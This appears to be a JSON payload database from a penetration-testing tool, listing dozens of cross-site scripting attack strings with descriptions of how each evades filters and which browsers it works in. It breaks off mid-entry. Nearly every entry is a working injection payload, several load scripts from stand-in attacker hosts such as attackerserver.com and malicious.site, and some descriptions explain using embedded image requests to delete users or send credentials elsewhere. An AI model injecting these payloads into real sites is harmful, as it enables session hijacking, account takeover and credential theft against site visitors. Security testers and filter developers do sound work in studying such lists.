{
    "564af686748897.41297120": {
        "pName": "XSS Locator",
        "pType": "XSS",
        "pCategory": "Basic XSS Attacks",
        "payload": "';alert(String.fromCharCode(88,83,83))\/\/\\';alert(String.fromCharCode(88,83,83))\/\/\";alert(String.fromCharCode(88,83,83))\/\/\\\";alert(String.fromCharCode(88,83,83))\/\/--><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>",
        "pDescription": "<p>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word &quot;XSS&quot; will pop up.&nbsp; You&#39;ll need to replace the &quot;&amp;&quot; with &quot;%26&quot; if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.&nbsp; Tip: If you&#39;re in a rush and need to quickly check a page, often times injecting the deprecated &quot;&lt;PLAINTEXT&gt;&quot; tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.<\/p>\r\n\r\n<p><span class=\"marker\"><em><strong>Browser support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/span><\/p>\r\n"
    },
    "564af726382db6.13267019": {
        "pName": "XSS Quick Test",
        "pType": "XSS",
        "pCategory": "Basic XSS Attacks",
        "payload": "'';!--\"<Mth3l3m3nt>=&{()}",
        "pDescription": "<p>If you don&#39;t have much space, this string is a nice compact XSS injection check. View source after injecting it and look for &lt;Mth3l3m3nt versus &amp;lt;Mth3l3m3nt to see if it is vulnerable.<\/p>\r\n\r\n<p><em><strong>Browser support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564af786b5bab3.02088378": {
        "pName": "Script w\/Alert ()",
        "pType": "XSS",
        "pCategory": "Basic XSS Attacks",
        "payload": "<SCRIPT>alert('Mth3l3m3nt')<\/SCRIPT>",
        "pDescription": "<p>Basic injection attack, Should Popup an alert box with the word <em>&quot;Mth3l3m3nt&quot;.<\/em><\/p>\r\n\r\n<p><em><strong>Browser support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564af8240af269.46109890": {
        "pName": "Script w\/Source File",
        "pType": "XSS",
        "pCategory": "Basic XSS Attacks",
        "payload": "<SCRIPT SRC=http:\/\/attackerserver.com\/xss.js><\/SCRIPT>",
        "pDescription": "<p>No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).<\/p>\r\n\r\n<p><em><strong>Browser support:&nbsp;[IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564af89a794ef7.96272700": {
        "pName": "Script w\/Charcode",
        "pType": "XSS",
        "pCategory": "Basic XSS Attacks",
        "payload": "<SCRIPT>alert(String.fromCharCode(109, 116, 104, 51, 108, 51, 109, 51, 110, 116))<\/SCRIPT>",
        "pDescription": "<p>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word <em>&quot;mth3l3m3nt&quot;<\/em> will pop up.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser support:&nbsp;[IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b39d694ee80.80218022": {
        "pName": "Base",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<BASE HREF=\"javascript:alert('Mth3l3m3nt');\/\/\">",
        "pDescription": "<p>Works in IE and Netscape 8.1 in safe mode.&nbsp; You need the \/\/ to comment out the next characters so you won&#39;t get a JavaScript error and your XSS tag will render.&nbsp; Also, this relies on the fact that the website uses dynamically placed images like &quot;images\/image.jpg&quot; rather than full paths.&nbsp;<\/p>\r\n\r\n<p>If the path includes a leading forward slash like &quot;\/images\/image.jpg&quot; you can remove one slash from this vector (as long as there are two to begin the comment this will work.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n"
    },
    "564b3a13b76b80.08725636": {
        "pName": "BGSOUND",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<BGSOUND SRC=\"javascript:alert('Mth3l3m3nt');\">",
        "pDescription": "<p>This utilizes the BGSOUND element to popup an alert box.<\/p>\r\n\r\n<p><em><strong>Browser Support: [O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b3a5b746e06.28639482": {
        "pName": "Body Background",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<BODY BACKGROUND=\"javascript:alert('Mth3l3m3nt');\">",
        "pDescription": "<p>This attempts to load a body background image and if the javascript: declarative is used it evaluates the script that follows.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b3a98359da7.31581571": {
        "pName": "Body Onload",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<BODY ONLOAD=alert('mth3l3m3nt')>",
        "pDescription": "<p>This attack takes advantage of the onload event listener to run a specific javascript function.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n"
    },
    "564b3adf286f36.51790853": {
        "pName": "Div background-image",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<DIV STYLE=\"background-image: url(javascript:alert('mth3l3m3nt'))\">",
        "pDescription": "<p>This exploits the background-image property of a div element in HTML to run a script.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3b3c5ba9f8.98153554": {
        "pName": "Div background-image alt",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<DIV STYLE=\"background-image: url(&#1;javascript:alert('mth3l3m3nt'))\">",
        "pDescription": "<p>Div background-image plus extra characters.&nbsp; It takes advantage of erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.&nbsp; (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3b797d6b60.56709281": {
        "pName": "Div Expression",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<DIV STYLE=\"width: expression(alert('mth3l3m3nt'));\">",
        "pDescription": "<p>Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and &quot;expression&quot;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3bb3453a21.54510859": {
        "pName": "Frame",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<FRAMESET><FRAME SRC=\"javascript:alert('mth3l3m3nt');\"><\/FRAMESET>",
        "pDescription": "<p>Frame (Frames have the same sorts of XSS problems as iframes).<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b3bda69b826.34268927": {
        "pName": "Iframe",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IFRAME SRC=\"javascript:alert('mth3l3m3nt');\"><\/IFRAME>",
        "pDescription": "<p>Iframe (If iframes are allowed there are a lot of other XSS problems as well).<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b3c3d8c0af3.86655346": {
        "pName": "Input Image",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>this takes advantage of the input element type and src directives to force javascript to execute instead of an image loading.<\/p>\r\n"
    },
    "564b3c7e141829.86034504": {
        "pName": "Image w\/ javascript directive",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG SRC=\"javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>Image XSS using the JavaScript directive. (IE7.0 doesn&#39;t support the JavaScript directive in context of an image, but it does in other contexts.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b3ce9b21848.34361365": {
        "pName": "IMG no quotes or semicolon",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG SRC=javascript:alert('mth3l3m3nt')>",
        "pDescription": "<p>No quotes and no semicolon<\/p>\r\n\r\n<p>Browser Support: [IE6.0][NS8.1-IE][O9.02]<\/p>\r\n"
    },
    "564b3d3fe0f4d0.85799286": {
        "pName": "Img dynsrc",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG DYNSRC=\"javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>Takes advantage of the dynsrc directive in the img element.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3d81129a20.91895472": {
        "pName": "Img lowsrc",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG LOWSRC=\"javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>Takes advantage of the lowsrc directive in the IMG element .<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3e42d68d43.73430776": {
        "pName": "Img src embed commands",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG SRC=\"http:\/\/www.thesiteyouareon.com\/somecommand.php?somevariables=maliciouscode\">",
        "pDescription": "<p>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.&nbsp;<\/p>\r\n\r\n<p>This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...&nbsp; This is one of the lesser used but more useful XSS vectors.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n"
    },
    "564b3e9281fc33.18536408": {
        "pName": "Img src embed commands alt",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "Redirect 302 \/a.jpg http:\/\/victimsite.com\/admin.asp&deleteuser",
        "pDescription": "<p>IMG Embedded commands alt is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain.<\/p>\r\n\r\n<p>The vector uses a 302 or 304 (others work too) to redirect the image back to a command.<\/p>\r\n\r\n<p>So a normal&nbsp;&lt;img src=&quot;http:\/\/somemalicoussite.com\/a.jpg&quot; \/&gt; could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).<\/p>\r\n\r\n<p><em><strong>Browser Support: &nbsp;[IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b3f328b95d4.86573956": {
        "pName": "Img style w\/ expression",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "exp\/*<Mth STYLE='no\\xss:noxss(\"*\/\/*\"); mth:&#101;x&#x2F;*mth3l3m3nt*\/\/*\/*\/pression(alert(\"mth3l3m3nt\"))'>",
        "pDescription": "<p>IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3f73b9eaf2.58860399": {
        "pName": "List style image",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}<\/STYLE><UL><LI>mth3l3m3nt",
        "pDescription": "<p>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3f9f9129a9.13073783": {
        "pName": "Img w\/ vbscript",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG SRC='vbscript:msgbox(\"mth3l3m3nt\")'>",
        "pDescription": "<p>This loads vbscript in an image.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b3fcf726b99.98717679": {
        "pName": "Layer",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<LAYER SRC=\"http:\/\/malicious.site\/scriptlet.html\"><\/LAYER>",
        "pDescription": "<p>The attack on this elements works on older versions of Netscape only.<\/p>\r\n"
    },
    "564b3feb8ea2b4.75200809": {
        "pName": "livescript",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG SRC=\"livescript:[code]\">",
        "pDescription": "<p>This attack works on older versions of netscape only.<\/p>\r\n"
    },
    "564b4017ab7816.35737913": {
        "pName": "Meta",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>The odd thing about meta refresh is that it doesn&#39;t send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b40498130c3.32566172": {
        "pName": "Meta w\/ data url",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text\/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
        "pDescription": "<p>This is nice because it also doesn&#39;t have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http:\/\/www.ietf.org\/rfc\/rfc2397.txt for more details<\/p>\r\n\r\n<p><em><strong>Browser Support: [NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b4076cc91e8.52887255": {
        "pName": "Meta w\/ additional url parameter",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http:\/\/;URL=javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>Meta with additional URL parameter. If the target website attempts to see if the URL contains an &quot;http:\/\/&quot; you can evade it with the following technique (Submitted by Moritz Naumann http:\/\/www.moritz-naumann.com)<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b4094dd0144.18341523": {
        "pName": "Mocha",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG SRC=\"mocha:[code]\">",
        "pDescription": "<p>This works in older versions of netscape only.<\/p>\r\n"
    },
    "564b40c0544a46.70350551": {
        "pName": "Object",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<OBJECT TYPE=\"text\/x-scriptlet\" DATA=\"http:\/\/malicious.site\/scriptlet.html\"><\/OBJECT>",
        "pDescription": "<p>If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS.<\/p>\r\n\r\n<p><em><strong>Browser Support: [O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b40e79a9994.51018930": {
        "pName": "Object w\/ embedded xss",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('mth3l3m3nt')><\/OBJECT>",
        "pDescription": "<p>Using an OBJECT tag you can embed XSS directly (this is unverified).<\/p>\r\n"
    },
    "564b4112cbca70.58368557": {
        "pName": "Embed flash",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<EMBED SRC=\"http:\/\/malicous.site\/xss.swf\" AllowScriptAccess=\"always\"><\/EMBED>",
        "pDescription": "<p>Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=&quot;never&quot; and allownetworking=&quot;internal&quot; it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http:\/\/ha.ckers.org\/weird\/xssflash.html :<\/p>\r\n"
    },
    "564b4142dc6af8.60247690": {
        "pName": "Object w\/ flash",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "a=\"get\";&#10;b=\"URL(\"\";&#10;c=\"javascript:\";&#10;d=\"alert('mth3l3m3nt');\")\"; eval(a+b+c+d);",
        "pDescription": "<p>Using this action script inside flash can obfuscate your XSS vector.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE][NS8.1-G][FF2.0][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b416122b5b4.93814997": {
        "pName": "Style",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<STYLE TYPE=\"text\/javascript\">alert('mth3l3m3nt');<\/STYLE>",
        "pDescription": "<p>STYLE tag (Older versions of Netscape only)<\/p>\r\n"
    },
    "564b41992fccd5.07939077": {
        "pName": "Style w\/ comment",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<IMG STYLE=\"xss:expr\/*mth3l3m3nt*\/ession(alert('mth3l3m3nt'))\">",
        "pDescription": "<p>STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http:\/\/www.pixel-apes.com\/ for this one)<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: &nbsp;[IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b41e0842a47.86117109": {
        "pName": "Style w\/ anonymous html",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<XSS STYLE=\"xss:expression(alert('mth3l3m3t'))\">",
        "pDescription": "<p>Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don&#39;t really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b42122d7291.73538647": {
        "pName": "Style w\/ background-image",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<STYLE>.XSS{background-image:url(\"javascript:alert('mth3l3m3nt')\");}<\/STYLE><A CLASS=mth3l3m3nt><\/A>",
        "pDescription": "<p>STYLE tag using background-image.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b42447a91a5.27206884": {
        "pName": "Style w\/ background",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<STYLE type=\"text\/css\">BODY{background:url(\"javascript:alert('mth3l3m3nt')\")}<\/STYLE>",
        "pDescription": "<p>STYLE tag using background.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b43002b6d27.96478152": {
        "pName": "Style sheet",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('mth3l3m3nt');\">",
        "pDescription": "<p>Renders javascript in a stylesheet element.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b433c84b337.50934110": {
        "pName": "Remote stylesheet",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<LINK REL=\"stylesheet\" HREF=\"http:\/\/malicious.site\/xss.css\">",
        "pDescription": "<p>Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.&nbsp;<\/p>\r\n\r\n<p>Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won&#39;t work unless there is some content on the page other than the vector itself, so you&#39;ll need to add a single letter to the page to make it work if it&#39;s an otherwise blank page.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b4373084a78.41706738": {
        "pName": "Remote stylesheet 2",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<STYLE>@import'http:\/\/malicious.site\/xss.css';<\/STYLE>",
        "pDescription": "<p>Remote style sheet part 2 (this works the same as above, but uses a &lt;STYLE&gt; tag instead of a &lt;LINK&gt; tag). A slight variation on this vector was used to hack Google Desktop http:\/\/www.hacker.co.il\/security\/ie\/css_import.html.&nbsp;<\/p>\r\n\r\n<p>As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.&nbsp; This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n"
    },
    "564b4397a0abd6.18090237": {
        "pName": "Remote stylesheet 3",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<META HTTP-EQUIV=\"Link\" Content=\"<http:\/\/malicious.site\/xss.css>; REL=stylesheet\">",
        "pDescription": "<p>Remote style sheet part 3. This only works in Opera but is fairly tricky.&nbsp; Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).&nbsp;<\/p>\r\n\r\n<p>The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http:\/\/ha.ckers.org\/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.<\/p>\r\n"
    },
    "564b43e059ed65.61635661": {
        "pName": "Remote stylesheet 4",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<STYLE>BODY{-moz-binding:url(\"http:\/\/malicious.site\/xssmoz.xml#xss\")}<\/STYLE>",
        "pDescription": "<p>Remote style sheet part 4.&nbsp; This only works in Gecko rendering engines and works by binding an XUL file to the parent page.<\/p>\r\n\r\n<p>I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [NS8.1-G][FF2.0]<\/strong><\/em><\/p>\r\n"
    },
    "564b441c118f47.35808319": {
        "pName": "Table",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<TABLE BACKGROUND=\"javascript:alert('mth3l3m3nt')\"><\/TABLE>",
        "pDescription": "<p>Table background (who would have thought tables were XSS targets... except me, of course).<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b4454c37736.51181406": {
        "pName": "Table td",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<TABLE><TD BACKGROUND=\"javascript:alert('mth3l3m3nt')\"><\/TD><\/TABLE>",
        "pDescription": "<p>Affects the table data background property.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE][O9.02]<\/strong><\/em><\/p>\r\n"
    },
    "564b449d70a2a9.55732472": {
        "pName": "XML namespace",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<HTML xmlns:xss> <?import namespace=\"xss\" implementation=\"http:\/\/malicious.site\/xss.htc\"> <xss:xss>mth3l3m3nt<\/xss:xss> <\/HTML>",
        "pDescription": "<p>XML namespace. The .htc file must be located on the server as your XSS vector.<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b44dea66a42.99795301": {
        "pName": "XML data island w\/ CDATA",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('mth3l3m3nt');\">]]> <\/C><\/X><\/xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>",
        "pDescription": "<p>XML data island with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 IE rendering engine mode) - vector found by Sec Consult http:\/\/www.sec-consult.html while auditing Yahoo.<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b453810f6f8.92560039": {
        "pName": "XML data island w\/ comment",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('mth3l3m3nt')\"><\/B><\/I><\/XML> <SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"><\/SPAN>",
        "pDescription": "<p>XML data island with comment obfuscation (doesn&#39;t use CDATA fields, but rather uses comments to break up the javascript directive)<\/p>\r\n\r\n<p>&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;mth3l3m3nt&#39;)&quot;&gt;&lt;\/B&gt;&lt;\/I&gt;&lt;\/XML&gt;<br \/>\r\n&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;\/SPAN&gt;<\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b4574bc8633.80563592": {
        "pName": "XML (locally hosted)",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<XML SRC=\"http:\/\/malicious.site\/xsstest.xml\" ID=I><\/XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><\/SPAN>",
        "pDescription": "<p>Locally hosted XML with embedded JavaScript that is generated using an XML data island. This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains the cross site scripting vector.<\/p>\r\n\r\n<p>&lt;XML SRC=&quot;http:\/\/malicious.site\/xsstest.xml&quot; ID=I&gt;&lt;\/XML&gt;<br \/>\r\n&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;\/SPAN&gt;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b45b05d3445.10397915": {
        "pName": "XML html + time",
        "pType": "XSS",
        "pCategory": "HTML element attacks",
        "payload": "<HTML><BODY> <?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> <?import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert('XSS')<\/SCRIPT>\"> <\/BODY><\/HTML>",
        "pDescription": "<p>HTML+TIME in XML. This is how Grey Magic http:\/\/www.greymagic.com\/security\/advisories\/gm005-mc\/ hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work.<\/p>\r\n\r\n<p>&lt;HTML&gt;&lt;BODY&gt;<br \/>\r\n&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;<br \/>\r\n&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;<br \/>\r\n&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&#39;XSS&#39;)&lt;\/SCRIPT&gt;&quot;&gt; &lt;\/BODY&gt;&lt;\/HTML&gt;<\/p>\r\n\r\n<p><em><strong>Browser Support: [IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b46982372b7.34927679": {
        "pName": "commented-out block",
        "pType": "XSS",
        "pCategory": "Other",
        "payload": "<!--[if gte IE 4]> <SCRIPT>alert('mth3l3m3nt');<\/SCRIPT> <![endif]-->",
        "pDescription": "<p>Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).&nbsp;<\/p>\r\n\r\n<p>Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector.<\/p>\r\n\r\n<p>Or the system could add comment tags around something to attempt to render it harmless.&nbsp; As we can see, that probably wouldn&#39;t do the job.<\/p>\r\n\r\n<p>&lt;!--[if gte IE 4]&gt;<br \/>\r\n&lt;SCRIPT&gt;alert(&#39;mth3l3m3nt&#39;);&lt;\/SCRIPT&gt;<br \/>\r\n&lt;![endif]--&gt;<\/p>\r\n\r\n<p><em><strong>Browser Support: &nbsp;[IE7.0][IE6.0][NS8.1-IE]<\/strong><\/em><\/p>\r\n"
    },
    "564b46d26af515.99694341": {
        "pName": "Cookie manipulation",
